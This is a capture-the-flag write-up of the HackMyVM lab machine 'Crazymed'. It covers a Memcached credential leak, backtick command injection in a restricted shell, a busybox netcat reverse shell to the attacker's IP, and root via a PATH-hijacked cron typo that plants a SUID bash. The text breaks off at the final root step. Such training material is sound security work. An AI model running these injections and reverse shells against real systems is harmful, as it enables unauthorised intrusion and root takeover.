# Crazymed

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Crazymed | cromiphi | Beginner | HackMyVM |

**Summary:** Crazymed is a beginner-level Linux machine themed around a fictional "Crazy Medical Research Laboratory." The attack path begins with a host discovery and full port scan revealing four open services: SSH (22), HTTP (80), a custom password-protected shell on port 4444, and a publicly accessible Memcached instance on port 11211. Memcached is misconfigured and unauthenticated — enumerating its cache keys leaks a plaintext password (`cr[REDACTED]`) stored under the `log` key. This password grants access to the restricted shell on port 4444, which allows only a limited command set (`id`, `who`, `echo`, `clear`). However, the `echo` command fails to sanitize backtick (`` ` ``) command substitution, enabling Remote Code Execution. A reverse shell is sent via `busybox nc`, landing as user `brad`. Privilege escalation is achieved through a writable directory at `/usr/local/bin` — which appears in `PATH` before the system binary paths — combined with a root-owned cronjob (`/opt/check_VM`) that calls a misspelled command `eccho` (double `c`). By creating a malicious `eccho` script in `/usr/local/bin` that copies `/bin/bash` with the SUID bit set, the attacker waits for the cron job to execute, then runs the SUID binary with the `-p` flag to inherit `euid=0`, and finally escalates to a full root shell. Both `user.txt` and `root.txt` flags are captured.

---

## Reconnaissance

### Host Discovery

The attacker's machine is on the `192.168.100.0/24` subnet. A custom PowerShell script is used to ping-sweep the network and identify the VirtualBox target.

```bash
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.128 08:00:27:00:BE:09 VirtualBox
```

The target is confirmed at **192.168.100.128** (VirtualBox MAC prefix `08:00:27`).

---

### Port Scanning — Nmap Full TCP Scan

A comprehensive scan with default scripts (`-sC`), version detection (`-sV`), all ports (`-p-`), and aggressive timing (`-T4`) is run against the target.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crazymed]
└─$ nmap -sC -sV -p- -T4 192.168.100.128
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-25 19:39 WIB
Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 19:40 (0:00:09 remaining)
Nmap scan report for 192.168.100.128
Host is up (0.0019s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 db:fb:b1:fe:03:9c:17:36:83:ac:6b:c0:52:ad:a0:05 (RSA)
|   256 56:3b:7c:e3:23:4a:25:5a:be:54:d1:2e:9d:44:9a:06 (ECDSA)
|_  256 81:d4:2e:47:33:34:a9:6f:10:70:c1:90:80:aa:b6:6a (ED25519)
80/tcp    open  http      Apache httpd 2.4.54 ((Debian))
|_http-title: Crazymed Bootstrap Template - Index
|_http-server-header: Apache/2.4.54 (Debian)
4444/tcp  open  krb524?
| fingerprint-strings:
|   GetRequest:
|     [1;97mW
|     [1;97me
|     [1;97ml
|     [1;97mc
|     [1;97mo
|     [1;97mm
|     [1;97me
|     [1;97m
|     [1;97mt
|     [1;97mo
|     [1;97m
|     [1;97mt
|     [1;97mh
|     [1;97me
|     [1;97m
|     [1;97mC
|     [1;97mr
|     [1;97ma
|     [1;97mz
|     [1;97my
|     [1;97mm
|     [1;97me
|     [1;97md
|     [1;97m
|     [1;97mm
|     [1;97me
|     [1;97md
|     [1;97mi
|     [1;97mc
|     [1;97ma
|     [1;97ml
|     [1;97m
|     [1;97mr
|     [1;97me
|     [1;97ms
|     [1;97me
|     [1;97ma
|     [1;97mr
|     [1;97mc
|     [1;97mh
|     [1;97m
|     [1;97ml
|     [1;97ma
|     [1;97mb
|     [1;97mo
|     [1;97mr
|     [1;97ma
|     [1;97mt
|     [1;97mo
|     [1;97mr
|     [1;97my
|     [1;97m.
|     tests are performed on human volunteers for a fee.
|     Password:
|     [1;31mAccess denied.
|     Password:
|     [1;31mAccess denied.
|     Password:
|   NULL:
|     [1;97mW
|     [1;97me
|     [1;97ml
|     [1;97mc
|     [1;97mo
|     [1;97mm
|     [1;97me
|     [1;97m
|     [1;97mt
|     [1;97mo
|     [1;97m
|     [1;97mt
|     [1;97mh
|     [1;97me
|     [1;97m
|     [1;97mC
|     [1;97mr
|     [1;97ma
|     [1;97mz
|     [1;97my
|     [1;97mm
|     [1;97me
|     [1;97md
|     [1;97m
|     [1;97mm
|     [1;97me
|     [1;97md
|     [1;97mi
|     [1;97mc
|     [1;97ma
|     [1;97ml
|     [1;97m
|     [1;97mr
|     [1;97me
|     [1;97ms
|     [1;97me
|     [1;97ma
|     [1;97mr
|     [1;97mc
|     [1;97mh
|     [1;97m
|     [1;97ml
|     [1;97ma
|     [1;97mb
|     [1;97mo
|     [1;97mr
|     [1;97ma
|     [1;97mt
|     [1;97mo
|     [1;97mr
|     [1;97my
|     [1;97m.
|     tests are performed on human volunteers for a fee.
|_    Password:
11211/tcp open  memcached Memcached 1.6.9 (uptime 80 seconds)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4444-TCP:V=7.95%I=7%D=2/25%Time=699EED9A%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2C3,"\x1b\[H\x1b\[2J\x1b\[3J\x1b\[1;97mW\x1b\[0m\x1b\[1;97me\x1b\[0m
SF:\x1b\[1;97ml\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97m
SF:m\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mt\x1b\[0
SF:m\x1b\[1;97mo\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mt\x1b\[0m\x1b\[1
SF:;97mh\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mC\x1
SF:b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97ma\x1b\[0m\x1b\[1;97mz\x1b\[0m\x1b\[
SF:1;97my\x1b\[0m\x1b\[1;97mm\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97md\x1b\
SF:[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mm\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\
SF:[1;97md\x1b\[0m\x1b\[1;97mi\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97ma\x1b
SF:\[0m\x1b\[1;97ml\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b
SF:\[1;97me\x1b\[0m\x1b\[1;97ms\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97ma\x1
SF:b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97mh\x1b\[0m\x1b\[
SF:1;97m\x20\x1b\[0m\x1b\[1;97ml\x1b\[0m\x1b\[1;97ma\x1b\[0m\x1b\[1;97mb\x
SF:1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97ma\x1b\[0m\x1b\
SF:[1;97mt\x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97my\x1b
SF:\[0m\x1b\[1;97m\.\x1b\[0m\nAll\x20our\x20tests\x20are\x20performed\x20o
SF:n\x20human\x20volunteers\x20for\x20a\x20fee\.\n\n\nPassword:\x20")%r(Ge
SF:tRequest,30D,"\x1b\[H\x1b\[2J\x1b\[3J\x1b\[1;97mW\x1b\[0m\x1b\[1;97me\x
SF:1b\[0m\x1b\[1;97ml\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\
SF:[1;97mm\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mt\
SF:x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mt\x1b\[0m\
SF:x1b\[1;97mh\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;9
SF:7mC\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97ma\x1b\[0m\x1b\[1;97mz\x1b\[0m
SF:\x1b\[1;97my\x1b\[0m\x1b\[1;97mm\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;97m
SF:d\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mm\x1b\[0m\x1b\[1;97me\x1b\[0
SF:m\x1b\[1;97md\x1b\[0m\x1b\[1;97mi\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97
SF:ma\x1b\[0m\x1b\[1;97ml\x1b\[0m\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97mr\x1b\[
SF:0m\x1b\[1;97me\x1b\[0m\x1b\[1;97ms\x1b\[0m\x1b\[1;97me\x1b\[0m\x1b\[1;9
SF:7ma\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97mc\x1b\[0m\x1b\[1;97mh\x1b\[0m
SF:\x1b\[1;97m\x20\x1b\[0m\x1b\[1;97ml\x1b\[0m\x1b\[1;97ma\x1b\[0m\x1b\[1;
SF:97mb\x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97ma\x1b\[0
SF:m\x1b\[1;97mt\x1b\[0m\x1b\[1;97mo\x1b\[0m\x1b\[1;97mr\x1b\[0m\x1b\[1;97
SF:my\x1b\[0m\x1b\[1;97m\.\x1b\[0m\nAll\x20our\x20tests\x20are\x20performe
SF:d\x20on\x20human\x20volunteers\x20for\x20a\x20fee\.\n\n\nPassword:\x20\
SF:x1b\[1;31mAccess\x20denied\.\x1b\[0m\n\nPassword:\x20\x1b\[1;31mAccess\
SF:x20denied\.\x1b\[0m\n\nPassword:\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.23 seconds
```

**Key findings from the scan:**

| Port | Service | Notes |
| :--- | :--- | :--- |
| 22/tcp | OpenSSH 8.4p1 | Debian 11 — standard SSH, no obvious vuln |
| 80/tcp | Apache 2.4.54 | HTTP site titled "Crazymed Bootstrap Template - Index" |
| 4444/tcp | Custom shell | ANSI banner: "Welcome to the Crazymed medical research laboratory." — prompts for a `Password:` |
| 11211/tcp | Memcached 1.6.9 | In-memory caching daemon — **no authentication required** |

The ANSI escape sequences on port 4444 render as: **"Welcome to the Crazymed medical research laboratory. All our tests are performed on human volunteers for a fee."** — followed immediately by a `Password:` prompt. Without credentials, access is denied.

---

## Vulnerability Discovery — Memcached Credential Leak (Port 11211)

Memcached, when exposed without authentication and without being bound to localhost, allows any client to enumerate and retrieve all cached data. The attacker connects directly with `telnet` and runs Memcached text-protocol commands.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crazymed]
└─$ telnet 192.168.100.128 11211
Trying 192.168.100.128...
Connected to 192.168.100.128.
Escape character is '^]'.
stats
STAT pid 417
STAT uptime 444
STAT time 1772023555
STAT version 1.6.9
STAT libevent 2.1.12-stable
STAT pointer_size 64
STAT rusage_user 0.054311
STAT rusage_system 0.796575
STAT max_connections 1024
STAT curr_connections 1
STAT total_connections 357
STAT rejected_connections 0
STAT connection_structures 3
STAT response_obj_oom 0
STAT response_obj_count 1
STAT response_obj_bytes 65536
STAT read_buf_count 8
STAT read_buf_bytes 131072
STAT read_buf_bytes_free 49152
STAT read_buf_oom 0
STAT reserved_fds 20
STAT cmd_get 0
STAT cmd_set 1416
STAT cmd_flush 0
STAT cmd_touch 0
STAT cmd_meta 0
STAT get_hits 0
STAT get_misses 0
STAT get_expired 0
STAT get_flushed 0
STAT delete_misses 0
STAT delete_hits 0
STAT incr_misses 0
STAT incr_hits 0
STAT decr_misses 0
STAT decr_hits 0
STAT cas_misses 0
STAT cas_hits 0
STAT cas_badval 0
STAT touch_hits 0
STAT touch_misses 0
STAT auth_cmds 0
STAT auth_errors 0
STAT bytes_read 50282
STAT bytes_written 13482
STAT limit_maxbytes 67108864
STAT accepting_conns 1
STAT listen_disabled_num 0
STAT time_in_listen_disabled_us 0
STAT threads 4
STAT conn_yields 0
STAT hash_power_level 16
STAT hash_bytes 524288
STAT hash_is_expanding 0
STAT slab_reassign_rescues 0
STAT slab_reassign_chunk_rescues 0
STAT slab_reassign_evictions_nomem 0
STAT slab_reassign_inline_reclaim 0
STAT slab_reassign_busy_items 0
STAT slab_reassign_busy_deletes 0
STAT slab_reassign_running 0
STAT slabs_moved 0
STAT lru_crawler_running 0
STAT lru_crawler_starts 4
STAT lru_maintainer_juggles 2932
STAT malloc_fails 0
STAT log_worker_dropped 0
STAT log_worker_written 0
STAT log_watcher_skipped 0
STAT log_watcher_sent 0
STAT unexpected_napi_ids 0
STAT round_robin_fallback 0
STAT bytes 320
STAT curr_items 4
STAT total_items 1416
STAT slab_global_page_pool 0
STAT expired_unfetched 0
STAT evicted_unfetched 0
STAT evicted_active 0
STAT evictions 0
STAT reclaimed 0
STAT crawler_reclaimed 0
STAT crawler_items_checked 12
STAT lrutail_reflocked 0
STAT moves_to_cold 1416
STAT moves_to_warm 0
STAT moves_within_lru 0
STAT direct_reclaims 0
STAT lru_bumps_dropped 0
END
stats items
STAT items:1:number 4
STAT items:1:number_hot 0
STAT items:1:number_warm 0
STAT items:1:number_cold 4
STAT items:1:age_hot 0
STAT items:1:age_warm 0
STAT items:1:age 1
STAT items:1:mem_requested 320
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:evicted_active 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 12
STAT items:1:lrutail_reflocked 0
STAT items:1:moves_to_cold 1548
STAT items:1:moves_to_warm 0
STAT items:1:moves_within_lru 0
STAT items:1:direct_reclaims 0
STAT items:1:hits_to_hot 0
STAT items:1:hits_to_warm 0
STAT items:1:hits_to_cold 0
STAT items:1:hits_to_temp 0
END
stats cachedump 1 0
ITEM domain [8 b; 0 s]
ITEM server [9 b; 0 s]
ITEM log [18 b; 0 s]
ITEM conf_location [21 b; 0 s]
END
get domain
VALUE domain 0 8
crazymed
END
get server
VALUE server 0 9
127.0.0.1
END
get log
VALUE log 0 18
password: cr[REDACTED]
END
get conf_location
VALUE conf_location 0 21
/etc/memecacched.conf
END
```

**Analysis of cached keys:**

| Key | Value | Significance |
| :--- | :--- | :--- |
| `domain` | `crazymed` | Application domain name |
| `server` | `127.0.0.1` | Internal server reference |
| `log` | `password: cr[REDACTED]` | **Plaintext password — credential leak!** |
| `conf_location` | `/etc/memecacched.conf` | Config file path (note the typo: `memecacched`) |

The `log` key stores the password `cr[REDACTED]` in plaintext. This is almost certainly the password for the restricted shell on port 4444.

---

## Initial Access

### Phase 1 — Exploiting the Restricted Shell on Port 4444

Using the leaked credential, access is granted to the custom restricted command shell. The banner reads: *"Welcome to the Crazymed medical research laboratory. All our tests are performed on human volunteers for a fee."*

```bash
Welcome to the Crazymed medical research laboratory.
All our tests are performed on human volunteers for a fee.


Password: cr[REDACTED]
Access granted.

Type "?" for help.

System command: ?
Authorized commands: id who echo clear

System command: id
uid=1000(brad) gid=1000(brad) groups=1000(brad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
System command: who
System command: echo id'
System command:
...
System command: echo `whoami`
brad
brad
```

The shell restricts commands to `id`, `who`, `echo`, and `clear`. However, the `echo` command is vulnerable to **backtick command substitution** — the shell does not filter the `` ` `` character, meaning any command wrapped in backticks will be executed and the output returned. The test with `` echo `whoami` `` returns `brad` twice (once from the echo expansion, once from the shell), confirming code execution.

### Phase 2 — Reverse Shell via Backtick Injection

A `netcat` listener is started on the attacker's machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crazymed]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

The reverse shell payload is sent through the `echo` backtick injection using `busybox nc` (which supports the `-e` flag on Debian targets where the system `nc` may not):

```bash
System command: echo `busybox nc 192.168.100.1 4444 -e /bin/bash`
```

The listener catches the connection:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 63622
python3 -c 'import pty;pty.spawn("/bin/bash")'
brad@crazymed:~$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crazymed]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

brad@crazymed:~$ export SHELL=bash
brad@crazymed:~$ export TERM=xterm
brad@crazymed:~$ stty rows 150 cols 200
brad@crazymed:~$
```

The shell is fully upgraded to an interactive TTY using the standard `python3 pty` + `stty raw -echo` technique:
1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` — spawns a PTY
2. `Ctrl+Z` — suspends the local nc process
3. `stty raw -echo; fg` — disables local terminal echo and resumes nc, forwarding raw keystrokes
4. `export SHELL=bash`, `export TERM=xterm`, `stty rows 150 cols 200` — finalizes the terminal environment

### Phase 3 — User Flag

```bash
brad@crazymed:~$ ls -la
total 36
drwxr-xr-x 4 brad brad 4096 Feb 25 13:57 .
drwxr-xr-x 3 root root 4096 Oct 31  2022 ..
lrwxrwxrwx 1 root root    9 Feb 25 13:57 .bash_history -> /dev/null
-rw-r--r-- 1 brad brad  220 Oct 26  2022 .bash_logout
-rw-r--r-- 1 brad brad 3526 Oct 31  2022 .bashrc
drwxr-xr-x 3 brad brad 4096 Nov  1  2022 .local
-rw-r--r-- 1 brad brad  807 Oct 26  2022 .profile
drwx------ 2 brad brad 4096 Oct 29  2022 .ssh
-rwx------ 1 brad brad   33 Oct 31  2022 user.txt
-rw-r--r-- 1 brad brad  165 Oct 31  2022 .wget-hsts
```

`user.txt` is present in `brad`'s home directory (`-rwx------`), readable only by `brad`. Note that `.bash_history` is symlinked to `/dev/null` — a deliberate anti-forensics measure by the machine author to suppress command history.

---

## Privilege Escalation

### Step 1 — Process Monitoring with pspy64

To observe root-level processes without having root privileges, `pspy64` (a tool that reads `/proc` to detect process events) is transferred from the attacker's machine via a Python HTTP server.

**Attacker machine:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/tools]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.21.32.1 - - [25/Feb/2026 20:04:35] "GET /pspy64 HTTP/1.1" 200 -
```

**Target machine:**

```bash
brad@crazymed:~$ wget http://192.168.100.1:8080/pspy64
--2026-02-25 14:04:33--  http://192.168.100.1:8080/pspy64
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64                                              0%[                                              pspy64                                            100%[=============================================================================================================>]   2.96M  --.-KB/s    in 0.08s

2026-02-25 14:04:33 (38.3 MB/s) - 'pspy64' saved [3104768/3104768]

brad@crazymed:~$ chmod +x pspy64
```

### Step 2 — Discovering the Root Cron Job

Running pspy64 reveals a cron job executing as `UID=0` (root) every minute:

```bash
2026/02/25 14:08:58 CMD: UID=0     PID=8153   | /bin/bash /root/.local/mem
2026/02/25 14:08:59 CMD: UID=0     PID=8154   | (mem)
2026/02/25 14:08:59 CMD: UID=0     PID=8155   | /bin/bash /root/.local/mem
2026/02/25 14:09:01 CMD: UID=0     PID=8156   | /sbin/init
2026/02/25 14:09:01 CMD: UID=0     PID=8157   | /sbin/init
2026/02/25 14:09:01 CMD: UID=0     PID=8158   | /bin/bash /root/.local/mem
2026/02/25 14:09:01 CMD: UID=0     PID=8162   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8161   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8160   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8159   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8163   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8164   | /bin/sh /usr/sbin/phpquery -V
2026/02/25 14:09:01 CMD: UID=0     PID=8167   | /bin/sh /usr/sbin/phpquery -V
2026/02/25 14:09:01 CMD: UID=0     PID=8166   | /bin/sh /usr/sbin/phpquery -V
2026/02/25 14:09:01 CMD: UID=0     PID=8168   | /bin/sh /usr/sbin/phpquery -V
2026/02/25 14:09:01 CMD: UID=0     PID=8169   | /bin/sh /usr/sbin/phpquery -V
2026/02/25 14:09:01 CMD: UID=0     PID=8170   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8173   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8172   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8171   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8176   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8175   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8174   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8179   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8178   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8177   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8182   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8181   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8180   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8183   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8186   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8185   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8184   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8189   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8188   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8187   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8192   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8191   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8190   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8195   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8194   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8193   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8196   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8197   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8198   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8199   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8200   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8201   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8202   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8203   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8204   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8205   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8206   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8207   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8208   | /bin/sh -e /usr/lib/php/sessionclean
2026/02/25 14:09:01 CMD: UID=0     PID=8212   | /usr/sbin/CRON -f
2026/02/25 14:09:01 CMD: UID=0     PID=8211   | /usr/sbin/cron -f
2026/02/25 14:09:01 CMD: UID=0     PID=8213   | /usr/sbin/CRON -f
2026/02/25 14:09:01 CMD: UID=0     PID=8214   | /usr/sbin/CRON -f
2026/02/25 14:09:01 CMD: UID=0     PID=8215   | /bin/sh -c /opt/check_VM
2026/02/25 14:09:01 CMD: UID=0     PID=8216   | /bin/bash /opt/check_VM
2026/02/25 14:09:01 CMD: UID=0     PID=8220   | /bin/bash /opt/check_VM
2026/02/25 14:09:01 CMD: UID=0     PID=8219   | /bin/bash /opt/check_VM
2026/02/25 14:09:01 CMD: UID=0     PID=8218   | /bin/bash /opt/check_VM
2026/02/25 14:09:01 CMD: UID=0     PID=8217   | /bin/bash /opt/check_VM
2026/02/25 14:09:01 CMD: UID=0     PID=8221   | /bin/bash /opt/check_VM
2026/02/25 14:09:01 CMD: UID=0     PID=8222   | /bin/bash /opt/check_VM
2026/02/25 14:09:01 CMD: UID=0     PID=8223   | /bin/bash /opt/check_VM
2026/02/25 14:09:01 CMD: UID=0     PID=8224   | /bin/bash /opt/check_VM
2026/02/25 14:09:01 CMD: UID=0     PID=8225   | /bin/bash /opt/check_VM
2026/02/25 14:09:02 CMD: UID=0     PID=8226   | (mem)
2026/02/25 14:09:02 CMD: UID=0     PID=8227   | /bin/bash /root/.local/mem
2026/02/25 14:09:03 CMD: UID=0     PID=8228   | /sbin/init
2026/02/25 14:09:03 CMD: UID=0     PID=8229   | /bin/bash /root/.local/mem
2026/02/25 14:09:04 CMD: UID=0     PID=8230   | (mem)
```

The critical line is: **`/bin/sh -c /opt/check_VM`** — running as `UID=0`. This script at `/opt/check_VM` is executed by root's cron every minute.

### Step 3 — Analysing the Cron Script

```bash
brad@crazymed:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Nov  1  2022 .
drwxr-xr-x 18 root root 4096 Oct 31  2022 ..
-rwxr-xr--  1 root root  434 Nov  1  2022 check_VM
brad@crazymed:/opt$ file check_VM
check_VM: Bourne-Again shell script, ASCII text executable
brad@crazymed:/opt$ cat check_VM
#! /bin/bash

#users flags
flags=(/root/root.txt /home/brad/user.txt)
for x in "${flags[@]}"
do
if [[ ! -f $x ]] ; then
echo "$x doesn't exist"
mcookie > $x
chmod 700 $x
fi
done

chown -R www-data:www-data /var/www/html

#bash_history => /dev/null
home=$(cat /etc/passwd |grep bash |awk -F: '{print $6}')

for x in $home
do
ln -sf /dev/null $x/.bash_history ; eccho "All's fine !"
done


find /var/log -name "*.log*" -exec rm -f {} +
```

**Critical observation:** The script calls `eccho` (with a double `c`) at the end of the loop — this is a **typo** of the real `echo` command. Since `eccho` does not exist in the system's standard binary paths (`/usr/bin`, `/bin`), bash will search the `$PATH` for it. The key is: **does the attacker control any directory that appears in `$PATH` before the system directories?**

### Step 4 — Identifying the PATH Hijack Opportunity

```bash
brad@crazymed:/opt$ ls -ld /usr/local/bin
drwxr-xrwx 2 root root 4096 Feb 25 14:19 /usr/local/bin
```

`/usr/local/bin` has permissions `drwxr-xrwx` — **world-writable** (`rwx` for others). On Debian, `/usr/local/bin` appears in `$PATH` before `/usr/bin` and `/bin`. This means any file placed in `/usr/local/bin` will be resolved first when root's cron runs `eccho`.

### Step 5 — Creating the Malicious `eccho` Script

The attacker navigates to `/usr/local/bin` and uses `nano` to create a malicious `eccho` script that copies `/bin/bash` to `/tmp/rootbash` with the SUID bit set (`chmod +s`):

```bash
brad@crazymed:/opt$ cd /usr/local/bin
brad@crazymed:/usr/local/bin$ which nano
/usr/bin/nano
brad@crazymed:/usr/local/bin$ nano
brad@crazymed:/usr/local/bin$ cat eccho
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
brad@crazymed:/usr/local/bin$ chmod +x eccho
```

The malicious `eccho` script:
1. Copies `/bin/bash` to `/tmp/rootbash` (creating a copy owned by root)
2. Sets the SUID (`+s`) bit on it — meaning any user who runs it will inherit the file owner's UID (root)

### Step 6 — Waiting for the Cron Job to Fire

```bash
brad@crazymed:/usr/local/bin$ ls -l /tmp/rootbash
ls: cannot access '/tmp/rootbash': No such file or directory
brad@crazymed:/usr/local/bin$ sleep 60
brad@crazymed:/usr/local/bin$ ls -l /tmp/rootbash
-rwsr-sr-x 1 root root 1234376 Feb 25 14:25 /tmp/rootbash
```

After approximately 60 seconds (one cron tick), `/tmp/rootbash` appears with SUID/SGID bits set (`rwsr-sr-x`) and is owned by root — confirming the malicious `eccho` was executed by the root cron job.

### Step 7 — Escalating to Root

Running the SUID bash binary with the `-p` flag (preserve privileges) inherits the effective UID of the file owner (root):

```bash
